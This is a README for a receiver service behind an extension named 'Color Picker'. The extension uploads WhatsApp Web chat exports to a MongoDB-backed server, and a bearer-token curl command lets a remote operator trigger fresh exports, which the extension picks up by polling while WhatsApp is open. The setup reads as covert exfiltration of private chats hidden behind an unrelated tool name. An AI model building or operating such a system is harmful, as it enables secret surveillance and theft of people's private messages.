# Receiver

Small HTTP service for the Color Picker extension. Chat text is stored in MongoDB, not on the Render disk.

## Env

Copy `.env.example` to `.env` for local runs:

- `PORT` — default `8787`
- `TOKEN` — shared secret. The extension sends `Authorization: Bearer <TOKEN>`
- `MONGODB_URI` — your MongoDB connection string (include a database name)

Do not commit `.env`.

## Local

```bash
cd receiver
npm install
npm start
```

## Render

Set `TOKEN` and `MONGODB_URI` in the service environment. Start command: `npm start`. Root directory: `receiver`.

Free instances sleep when idle. Polling from the extension wakes them while WhatsApp Web is open. Documents stay in MongoDB across restarts.

## Routes

All routes except `GET /health` require the bearer token.

- `GET /health`
- `POST /upload` — JSON `{ chatId, chatName, filename, text, exportedAt, fromDate, toDate }`
- `GET /exports` — recent metadata. Add `?includeText=1` to include the TXT body
- `GET /trigger` — `{ export_requested: boolean }`
- `POST /trigger` — ask the extension to export again
- `POST /trigger/ack` — extension calls this only after all 10 uploads succeed

Remote export:

```bash
curl -X POST "$URL/trigger" -H "Authorization: Bearer $TOKEN"
```
